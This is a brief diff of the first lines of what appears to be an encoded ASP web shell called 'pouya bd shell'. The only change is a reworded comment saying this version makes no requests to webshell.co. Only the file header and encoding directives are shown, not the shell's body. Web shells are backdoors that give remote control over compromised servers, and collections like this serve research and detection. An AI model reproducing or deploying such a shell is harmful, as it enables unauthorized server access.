@@ -1,4 +1,4 @@
-this is a clean version of pouya bd shell and doesn't create a requests to webshell.co;
+this is a clean version of pouya bd shell and doesn't create requests to webshell.co;
 <%@ LANGUAGE = VBScript.Encode%>
 <%//**Start Encode
 On Error Resume Next
